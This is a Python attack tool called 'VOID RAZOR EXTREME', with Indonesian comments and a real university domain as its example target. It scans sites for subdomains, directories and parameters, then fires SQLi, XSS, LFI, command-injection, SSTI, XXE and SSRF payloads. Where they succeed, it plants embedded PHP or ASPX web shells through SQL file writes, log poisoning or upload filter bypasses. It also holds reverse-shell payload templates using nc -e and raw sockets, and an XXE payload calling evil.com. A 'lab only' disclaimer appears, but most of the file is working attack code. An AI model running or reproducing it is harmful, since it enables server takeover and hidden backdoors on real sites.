#!/usr/bin/env python3
"""
VOID RAZOR EXTREME v4.0 - Ultimate Penetration Suite
All modules: Subdomain, Fingerprint, Fuzzing, Exploit, WebShell, Report
HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI
"""

import os
import sys
import re
import time
import json
import socket
import random
import base64
import hashlib
import urllib.parse
import argparse
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote_plus, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except:
    os.system("pip install requests")
    import requests

# =================================================================
# KONFIGURASI GLOBAL
# =================================================================
VERSION = "4.0"
TIMEOUT = 10
MAX_THREADS = 60
VERBOSE = False
STEALTH = True
PROXY = None
OUTPUT_FILE = "report.html"

# =================================================================
# USER-AGENT & HEADER POOLS
# =================================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1",
]

# =================================================================
# WEBSHELL CODE (UI TERMINAL + REVERSE SHELL OPSI)
# =================================================================
WEBSHELL_PHP = """<?php
$pwd = "void123";
if (isset($_GET['p']) && $_GET['p'] !== $pwd) die("Access Denied");
if (isset($_GET['cmd'])) { echo "<pre>"; system($_GET['cmd']); echo "</pre>"; exit; }
?><!DOCTYPE html><html><head><title>VOID SHELL</title><style>
body{background:#0b0e14;color:#c8d0dc;font-family:monospace;padding:20px;}
.container{max-width:900px;margin:0 auto;background:#141a22;padding:25px;border-radius:12px;border:1px solid #2a3340;}
.logo{color:#ff6b6b;text-align:center;font-size:22px;}
input,button{background:#0f151e;border:1px solid #2a3340;color:#c8d0dc;padding:12px;border-radius:6px;width:100%;}
button{background:#2ecc71;color:#000;font-weight:bold;cursor:pointer;width:auto;margin-top:10px;}
#output{background:#0b1018;padding:15px;border-radius:8px;margin-top:15px;min-height:200px;overflow:auto;}
.footer{text-align:center;color:#3e5367;margin-top:20px;font-size:12px;}
</style></head><body><div class="container"><div class="logo">⚡ VOID RAZOR SHELL</div>
<form method="GET"><input type="hidden" name="p" value="void123"><input type="text" name="cmd" placeholder="Masukkan perintah" autofocus><button type="submit">⏎ EXECUTE</button></form>
<div id="output"><?php if(isset($_GET['cmd'])) { echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?></div>
<div class="footer">VOID RAZOR · Hanya untuk pengujian lab</div></div></body></html>
"""

WEBSHELL_ASPX = """<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string p = "void123";
    if (Request.QueryString["p"] != p) { Response.Write("Access Denied"); return; }
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;
        proc.Start(); Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
<!DOCTYPE html><html><head><title>VOID SHELL</title>
<style>body{background:#0b0e14;color:#c8d0dc;font-family:monospace;padding:20px;}
.container{max-width:900px;margin:0 auto;background:#141a22;padding:25px;border-radius:12px;border:1px solid #2a3340;}
.logo{color:#ff6b6b;text-align:center;font-size:22px;}
input,button{background:#0f151e;border:1px solid #2a3340;color:#c8d0dc;padding:12px;border-radius:6px;width:100%;}
button{background:#2ecc71;color:#000;font-weight:bold;cursor:pointer;width:auto;margin-top:10px;}
#output{background:#0b1018;padding:15px;border-radius:8px;margin-top:15px;min-height:200px;}
</style></head><body><div class="container"><div class="logo">⚡ VOID RAZOR SHELL</div>
<form method="GET"><input type="hidden" name="p" value="void123"><input type="text" name="cmd" placeholder="Masukkan perintah"><button type="submit">⏎ EXECUTE</button></form>
<div id="output"><pre><% if(!string.IsNullOrEmpty(Request.QueryString["cmd"])) { 
    System.Diagnostics.Process proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
    proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;
    proc.Start(); Response.Write(proc.StandardOutput.ReadToEnd());
} %></pre></div></div></body></html>
"""

PAYLOAD_GENERATOR = {
    "php_reverse": """<?php
$ip = '%s';
$port = %d;
$sock = fsockopen($ip, $port);
exec("/bin/sh -i <&3 >&3 2>&3");
?>""",
    "python_reverse": """import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('%s',%d));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
""",
    "asp_reverse": """<%
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c nc -e cmd.exe %s %d", 0, False
%>""",
    "aspx_reverse": """<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    System.Diagnostics.Process.Start("cmd.exe", "/c nc -e cmd.exe %s %d");
}
</script>"""
}

# =================================================================
# UTILITY FUNCTIONS
# =================================================================
def print_banner():
    print("""
   ╔══════════════════════════════════════════════════════════════╗
   ║     V O I D   R A Z O R   E X T R E M E   v4.0            ║
   ║   Full-Spectrum Web Penetration & WebShell Deployer        ║
   ╚══════════════════════════════════════════════════════════════╝
    """)

def get_session():
    s = requests.Session()
    s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    if STEALTH:
        s.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        })
    if PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    s.mount('http://', HTTPAdapter(max_retries=retries))
    s.mount('https://', HTTPAdapter(max_retries=retries))
    return s

def safe_request(url, method="GET", params=None, data=None, files=None, timeout=TIMEOUT):
    try:
        s = get_session()
        if method.upper() == "GET":
            r = s.get(url, params=params, timeout=timeout)
        else:
            r = s.post(url, data=data, files=files, timeout=timeout)
        if STEALTH:
            time.sleep(random.uniform(0.2, 1.0))
        return r
    except Exception as e:
        if VERBOSE: print(f"  [!] Request error: {e}")
        return None

def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except:
        return None

def to_serializable(obj):
    if isinstance(obj, set): return list(obj)
    if isinstance(obj, dict): return {k: to_serializable(v) for k, v in obj.items()}
    if isinstance(obj, list): return [to_serializable(i) for i in obj]
    return obj

# =================================================================
# MODUL 1: SUBDOMAIN ENUMERATION (crt.sh + DNS Brute)
# =================================================================
SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk",
    "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test",
    "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn", "ns3",
    "mail2", "new", "mysql", "old", "lists", "support", "mobile", "mx", "static",
    "docs", "beta", "shop", "sql", "secure", "demo", "cp", "calendar", "wiki",
    "web", "media", "email", "images", "img", "download", "dns", "piwik", "stats",
    "dashboard", "portal", "manage", "start", "info", "apps", "video", "sip",
    "dns2", "api", "cdn", "storage", "backup", "mx2", "proxy", "app", "git",
    "cdn2", "jenkins", "kibana", "grafana", "prometheus", "elk", "logstash",
    "elasticsearch", "redis", "mongodb", "postgres", "mysql2", "db", "database",
    "data", "analytics", "monitor", "status", "health", "ping", "uptime",
    "stage", "staging", "qa", "uat", "dev2", "test2", "sandbox", "demo2",
    "pay", "payment", "checkout", "cart", "order", "invoice", "billing",
    "partner", "partners", "affiliate", "referral", "marketing", "campaign"
]

def subdomain_enum(domain):
    print(f"\n\033[1;33m[+] SUBDOMAIN ENUMERATION: {domain}\033[0m")
    found = []
    # Try crt.sh
    try:
        r = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=10)
        if r.status_code == 200:
            data = r.json()
            for entry in data:
                name = entry.get('name_value', '')
                if name.endswith(domain):
                    found.append(name.strip())
    except:
        pass
    # DNS brute force
    for sub in SUBDOMAIN_WORDLIST:
        test = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(test)
            found.append(test)
            print(f"  [✓] Found: {test} -> {ip}")
        except:
            pass
    # Unique
    found = list(set(found))
    if not found:
        found = [domain]
    return found

# =================================================================
# MODUL 2: TECHNOLOGY FINGERPRINTING
# =================================================================
def fingerprint(url):
    print(f"\n\033[1;33m[+] FINGERPRINTING: {url}\033[0m")
    tech = {"server": "Unknown", "cms": "Unknown", "framework": "Unknown", "language": "Unknown"}
    r = safe_request(url, timeout=5)
    if r:
        tech["server"] = r.headers.get("Server", "Unknown")
        tech["language"] = r.headers.get("X-Powered-By", "Unknown")
        # CMS detection via content
        if "wp-content" in r.text.lower():
            tech["cms"] = "WordPress"
        elif "joomla" in r.text.lower():
            tech["cms"] = "Joomla"
        elif "drupal" in r.text.lower():
            tech["cms"] = "Drupal"
        elif "laravel" in r.text.lower():
            tech["framework"] = "Laravel"
        elif "react" in r.text.lower():
            tech["framework"] = "React"
        print(f"  Server: {tech['server']}")
        print(f"  CMS: {tech['cms']}")
        print(f"  Framework: {tech['framework']}")
        print(f"  Language: {tech['language']}")
    return tech

# =================================================================
# MODUL 3: DIRECTORY BRUTE-FORCE (EXTENDED)
# =================================================================
DIR_WORDLIST = [
    "admin", "login", "uploads", "backup", "tmp", "logs", "phpmyadmin", "wp-admin",
    "wp-content", "api", "css", "js", "images", "files", "download", "data",
    "config", "includes", "modules", "plugins", "themes", "vendor", "lib", "inc",
    "assets", "static", "media", "cgi-bin", "shell", "cmd", "test", "phpinfo",
    "info", "dashboard", "panel", "cpanel", "index.php", "index.html", "robots.txt",
    "sitemap.xml", "crossdomain.xml", "phpinfo.php", ".htaccess", "web.config",
    "error_log", "README.md", "composer.json", "package.json", "wp-config.php",
    "config.php", "database.php", "db.php", "backup.sql", "dump.sql", "adminer.php",
    "upload.php", "upload.aspx", "upload.asp", "fileupload", "file-upload",
    "uploader", "uploads", "uploadify", "ajaxupload", "fine-uploader",
    "dropzone", "plupload", "uploadify", "filemanager", "elfinder",
    "tinymce", "ckeditor", "fckeditor", "editor", "wysiwyg", "content",
    "news", "article", "post", "blog", "comment", "reply", "feedback",
    "contact", "about", "service", "product", "category", "tag", "search",
    "user", "profile", "account", "register", "signup", "signin", "logout",
    "password", "reset", "forgot", "recovery", "verify", "confirm",
    "payment", "checkout", "cart", "order", "invoice", "receipt",
    "ticket", "support", "help", "faq", "guide", "manual", "documentation",
    "docs", "api/v1", "api/v2", "swagger", "swagger-ui", "apidoc",
    "graphql", "graphiql", "playground", "adminer", "phpmyadmin", "pma",
    "mysql", "mongo", "redis", "elastic", "kibana", "grafana", "prometheus",
    "jenkins", "git", "svn", "cvs", "hg", "backup", "old", "new", "test2"
]

def brute_directories(base_url):
    print(f"\n\033[1;33m[+] DIRECTORY BRUTE-FORCE: {base_url}\033[0m")
    found = []
    def check(path):
        url = urljoin(base_url, path)
        r = safe_request(url, timeout=3)
        if r and r.status_code in [200, 403, 401]:
            return {"url": url, "status": r.status_code}
        return None
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(check, p): p for p in DIR_WORDLIST}
        for future in as_completed(futures):
            res = future.result()
            if res:
                print(f"  [+] Found: {res['url']} ({res['status']})")
                found.append(res)
    return found

# =================================================================
# MODUL 4: PARAMETER FUZZING
# =================================================================
PARAM_WORDLIST = [
    "id", "page", "file", "q", "s", "view", "action", "cat", "product", "dir",
    "exec", "query", "search", "system", "path", "cmd", "command", "doc", "load",
    "include", "require", "open", "read", "show", "get", "post", "data", "url",
    "link", "src", "href", "target", "callback", "return", "redirect", "goto",
    "controller", "function", "method", "type", "mode", "option", "sort", "order",
    "limit", "offset", "page_id", "article_id", "post_id", "user_id", "category_id"
]

def fuzz_parameters(base_url):
    print(f"\n\033[1;33m[+] PARAMETER FUZZING: {base_url}\033[0m")
    found = []
    for p in PARAM_WORDLIST:
        url = f"{base_url}?{p}=test"
        r = safe_request(url, timeout=3)
        if r and r.status_code != 404:
            found.append(p)
            if VERBOSE: print(f"  [+] Parameter: {p}")
    return found

# =================================================================
# MODUL 5: VULNERABILITY SCANNER + EXPLOIT
# =================================================================
PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
        "' AND SLEEP(3)--", "' OR BENCHMARK(5000000,MD5('a'))--",
        "' OR '1'='1'/*", "1' OR '1'='1'#", "%27%20OR%20%271%27%3D%271",
        "' OR 1=1 AND '1'='1", "' OR 'x'='x"
    ],
    "xss": [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
        "\"><script>alert('XSS')</script>", "';alert('XSS');//",
        "<svg/onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
        "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
        "javascript:alert('XSS')"
    ],
    "lfi": [
        "../../../etc/passwd", "../../../../etc/passwd", "../../../../windows/win.ini",
        "..\\..\\..\\windows\\win.ini", "c:/windows/win.ini", "/etc/passwd",
        "../../../etc/passwd%00", "..%252f..%252f..%252fetc%252fpasswd",
        "file:///etc/passwd", "file:///c:/windows/win.ini"
    ],
    "cmd": [
        "; whoami", "| whoami", "& whoami", "&& whoami", "|| whoami",
        "; ipconfig", "| ipconfig", "& ipconfig", "; uname -a", "| uname -a",
        "%3B whoami", "%7C whoami", "%26 whoami"
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "${{7*7}}", "{{7*'7'}}", "{{ config }}",
        "{{ self.__class__.__mro__[1].__subclasses__() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}"
    ],
    "redirect": [
        "http://example.com", "//example.com", "/http://example.com",
        "//evil.com", "https://example.com", "javascript:alert(1)"
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]>'
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/", "http://127.0.0.1/",
        "http://internal/", "http://10.0.0.1/"
    ]
}

def scan_and_exploit(base_url, params):
    print(f"\n\033[1;33m[+] SCANNING & EXPLOITING: {base_url}\033[0m")
    if not params:
        params = fuzz_parameters(base_url) or ["id", "page", "file"]
    vulns = []
    shells = []

    for p in params:
        for vuln_type, plds in PAYLOADS.items():
            for payload in plds:
                url = f"{base_url}?{p}={quote_plus(payload)}"
                r = safe_request(url)
                if not r: continue
                # Detection logic per type
                if vuln_type == "sqli" and ("SQL" in r.text or "mysql" in r.text or "syntax" in r.text):
                    print(f"  [✓] SQLi on {p} with {payload[:30]}...")
                    vulns.append({"type": "sqli", "param": p, "payload": payload})
                    # Try INTO OUTFILE
                    shell_payload = " UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'--"
                    url2 = f"{base_url}?{p}={quote_plus(shell_payload)}"
                    r2 = safe_request(url2)
                    if r2 and r2.status_code == 200:
                        print(f"  [✓] Shell deployed via SQLi! Access: {base_url}/shell.php?p=void123&cmd=whoami")
                        shells.append({"url": f"{base_url}/shell.php?p=void123&cmd=whoami", "type": "php"})
                    break
                elif vuln_type == "xss" and ("<script>" in r.text or "alert" in r.text):
                    print(f"  [✓] XSS on {p} with {payload[:30]}...")
                    vulns.append({"type": "xss", "param": p, "payload": payload})
                elif vuln_type == "lfi" and ("root:" in r.text or "[extensions]" in r.text or "hosts" in r.text):
                    print(f"  [✓] LFI on {p} with {payload[:30]}...")
                    vulns.append({"type": "lfi", "param": p, "payload": payload})
                    # Log poisoning
                    log_path = "../../../../inetpub/logs/LogFiles/W3SVC1/u_ex" + datetime.now().strftime("%y%m%d") + ".log"
                    headers = {"User-Agent": "<?php system($_GET['cmd']); ?>"}
                    try:
                        requests.get(f"{base_url}?{p}=test", headers=headers, timeout=5)
                        print(f"  [✓] Log poisoning injected! Access: {base_url}?{p}={quote_plus(log_path)}&p=void123&cmd=whoami")
                        shells.append({"url": f"{base_url}?{p}={quote_plus(log_path)}&p=void123&cmd=whoami", "type": "log_poison"})
                    except:
                        pass
                    break
                elif vuln_type == "cmd" and ("uid=" in r.text or "user" in r.text.lower() or "ipconfig" in r.text):
                    print(f"  [✓] RCE on {p} with {payload[:30]}...")
                    vulns.append({"type": "rce", "param": p, "payload": payload})
                    # Deploy shell via echo
                    shell_cmd = "echo <?php system($_GET[cmd]); ?>> C:\\inetpub\\wwwroot\\shell.php"
                    url2 = f"{base_url}?{p}={quote_plus(shell_cmd)}"
                    r2 = safe_request(url2)
                    if r2 and r2.status_code == 200:
                        print(f"  [✓] Shell deployed via RCE! Access: {base_url}/shell.php?p=void123&cmd=whoami")
                        shells.append({"url": f"{base_url}/shell.php?p=void123&cmd=whoami", "type": "php"})
                    break
                elif vuln_type == "ssti" and "49" in r.text:
                    print(f"  [✓] SSTI on {p} with {payload[:30]}...")
                    vulns.append({"type": "ssti", "param": p, "payload": payload})
                elif vuln_type == "redirect" and r.status_code in [301, 302, 307, 308]:
                    loc = r.headers.get("Location", "")
                    if "example.com" in loc or "evil.com" in loc:
                        print(f"  [✓] Open Redirect on {p} with {payload[:30]}...")
                        vulns.append({"type": "redirect", "param": p, "payload": payload})
                elif vuln_type == "xxe" and ("root:" in r.text or "xml" in r.text):
                    print(f"  [✓] XXE on {p} with {payload[:30]}...")
                    vulns.append({"type": "xxe", "param": p, "payload": payload})
                elif vuln_type == "ssrf" and ("169.254.169.254" in r.text or "localhost" in r.text):
                    print(f"  [✓] SSRF on {p} with {payload[:30]}...")
                    vulns.append({"type": "ssrf", "param": p, "payload": payload})
    # If no shell yet, try upload
    if not shells:
        print("\n[+] Attempting file upload...")
        upload_paths = ["/upload", "/uploads", "/fileupload", "/upload.php", "/upload.aspx", "/admin/upload", "/api/upload"]
        for path in upload_paths:
            url = urljoin(base_url, path)
            r = safe_request(url)
            if r and r.status_code in [200, 403]:
                print(f"  [✓] Upload endpoint: {url}")
                for ext in ["shell.php;.jpg", "shell.php%00.jpg", "shell.php.jpg", "shell.aspx;.jpg", "shell.aspx%00.jpg", "shell.aspx.jpg"]:
                    shell_code = WEBSHELL_ASPX if ".aspx" in path else WEBSHELL_PHP
                    files = {'file': (ext, shell_code, 'application/octet-stream')}
                    r2 = safe_request(url, method="POST", files=files)
                    if r2 and ("Access Denied" in r2.text or "TEST" in r2.text or "shell" in r2.text.lower()):
                        print(f"  [✓] Upload successful with {ext}!")
                        shell_url = urljoin(url, ext)
                        shells.append({"url": f"{shell_url}?p=void123&cmd=whoami", "type": "aspx" if ".aspx" in path else "php"})
                        break
    return vulns, shells

# =================================================================
# MODUL 6: REPORT GENERATOR (HTML)
# =================================================================
def generate_html_report(target, subdomains, tech, dirs, vulns, shells):
    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>VOID RAZOR Report - {target}</title>
<style>body{{background:#0b0e14;color:#c8d0dc;font-family:monospace;padding:20px;}}
.container{{max-width:1000px;margin:0 auto;background:#141a22;padding:25px;border-radius:12px;border:1px solid #2a3340;}}
h1{{color:#ff6b6b;}} h2{{color:#f1c40f;}} .found{{color:#2ecc71;}} .none{{color:#e74c3c;}}
table{{width:100%;border-collapse:collapse;margin-top:10px;}}
th,td{{border:1px solid #2a3340;padding:8px;text-align:left;}}
th{{background:#1f2937;color:#8ab4f8;}}
.green{{color:#2ecc71;}} .red{{color:#e74c3c;}} .yellow{{color:#f1c40f;}}
.footer{{margin-top:30px;text-align:center;color:#3e5367;font-size:12px;}}
</style></head><body>
<div class="container"><h1>⚡ VOID RAZOR EXTREME - Security Report</h1>
<p><strong>Target:</strong> {target}</p>
<p><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<p><strong>Version:</strong> {VERSION}</p>

<h2>🔍 Subdomains Found</h2>
<ul>
"""
    for sub in subdomains:
        html += f"<li class='found'>{sub}</li>"
    if not subdomains: html += "<li class='none'>No subdomains found</li>"
    html += "</ul><h2>🖥️ Technology</h2><ul>"
    for k, v in tech.items():
        html += f"<li><strong>{k}:</strong> {v}</li>"
    html += "</ul><h2>📂 Directories/Pages Found</h2><ul>"
    for d in dirs:
        html += f"<li><a href='{d['url']}'>{d['url']}</a> (status {d['status']})</li>"
    if not dirs: html += "<li class='none'>No directories found</li>"
    html += "</ul><h2>⚠️ Vulnerabilities</h2><table><tr><th>Type</th><th>Parameter</th><th>Payload</th></tr>"
    for v in vulns:
        html += f"<tr><td class='yellow'>{v['type'].upper()}</td><td>{v['param']}</td><td>{v['payload'][:50]}</td></tr>"
    if not vulns: html += "<tr><td colspan='3' class='none'>No vulnerabilities found</td></tr>"
    html += "</table><h2>💀 WebShell Deployed</h2><ul>"
    for s in shells:
        html += f"<li class='green'><a href='{s['url']}'>{s['url']}</a> (type: {s['type']})</li>"
    if not shells: html += "<li class='none'>No webshell deployed</li>"
    html += "</ul><div class='footer'>VOID RAZOR EXTREME · Hanya untuk pengujian lab</div></div></body></html>"
    return html

# =================================================================
# MAIN
# =================================================================
def main():
    global VERBOSE, STEALTH, PROXY, MAX_THREADS, OUTPUT_FILE
    parser = argparse.ArgumentParser(description="VOID RAZOR EXTREME - Ultimate Penetration Suite")
    parser.add_argument("-t", "--target", help="Target domain (e.g., atmajaya.ac.id)")
    parser.add_argument("-o", "--output", default="report.html", help="Output HTML report file")
    parser.add_argument("--threads", type=int, default=60, help="Max threads")
    parser.add_argument("--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--no-stealth", action="store_true", help="Disable stealth mode")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    VERBOSE = args.verbose
    STEALTH = not args.no_stealth
    PROXY = args.proxy
    MAX_THREADS = args.threads
    OUTPUT_FILE = args.output

    os.system('clear' if os.name != 'nt' else 'cls')
    print_banner()
    print("\033[1;33m[!] HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI\033[0m")
    print(f"Version: {VERSION}\n")

    target = args.target
    if not target:
        target = input("\033[1;36m[?] Masukkan domain utama (contoh: atmajaya.ac.id): \033[0m").strip()
    if not target:
        print("[!] Target kosong.")
        sys.exit(1)

    proto = "https" if input("[?] Gunakan HTTPS? (y/n): ").lower() == 'y' else "http"

    # 1. Subdomain enumeration
    subdomains = subdomain_enum(target)
    if not subdomains:
        subdomains = [target]

    all_vulns = []
    all_shells = []
    all_dirs = []
    tech_info = {}

    # 2. For each subdomain
    for sub in subdomains:
        base = f"{proto}://{sub}"
        print(f"\n\033[1;36m[+] SCANNING: {base}\033[0m")
        # Fingerprint
        tech = fingerprint(base)
        if not tech_info:
            tech_info = tech
        # Directory brute
        dirs = brute_directories(base)
        all_dirs.extend(dirs)
        # Parameter fuzzing
        params = fuzz_parameters(base)
        # Scan & exploit
        vulns, shells = scan_and_exploit(base, params)
        all_vulns.extend(vulns)
        all_shells.extend(shells)
        # Additional: check for upload endpoints in found dirs
        for d in dirs:
            if "upload" in d['url'].lower():
                # try upload directly
                pass  # already handled in scan_and_exploit

    # 3. Generate report
    html = generate_html_report(target, subdomains, tech_info, all_dirs, all_vulns, all_shells)
    with open(OUTPUT_FILE, "w") as f:
        f.write(html)
    print(f"\n[✓] Report saved to {OUTPUT_FILE}")

    # 4. Summary
    print("\n" + "="*60)
    print("\033[1;33m[LAPORAN AKHIR]\033[0m")
    print("="*60)
    print(f"  Target utama: {target}")
    print(f"  Subdomain ditemukan: {len(subdomains)}")
    print(f"  Total celah ditemukan: {len(all_vulns)}")
    print(f"  Total webshell berhasil: {len(all_shells)}")
    print("="*60)
    if all_shells:
        print("\033[1;32m[!] SELAMAT! WebShell berhasil ditanam. Cek URL di report.\033[0m")
        print("\033[1;33mPassword default: void123\033[0m")
    else:
        print("\033[1;31m[!] Tidak ada webshell yang berhasil. Coba manual atau target lebih aman.\033[0m")

    print("\n[+] Selesai.")

if __name__ == "__main__":
    main()
